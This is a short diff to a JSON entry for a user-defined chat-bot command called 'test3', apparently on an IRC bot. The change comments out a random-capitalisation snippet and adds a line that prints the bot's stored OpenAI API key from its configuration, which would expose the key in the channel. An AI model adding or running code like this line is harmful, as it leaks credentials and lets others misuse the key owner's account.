@@ -3,5 +3,5 @@
     "locked": false,
     "starred": false,
     "name": "test3",
-    "command": "print([...input].map(d => (Math.random()-.5)>0?d.toUpperCase():d).join``)"
+    "command": "//print([...input].map(d => (Math.random()-.5)>0?d.toUpperCase():d).join``)\nconst myvar = 7;\nprint(`${IRC.queryConfig('openaiKey')}`)"
 }
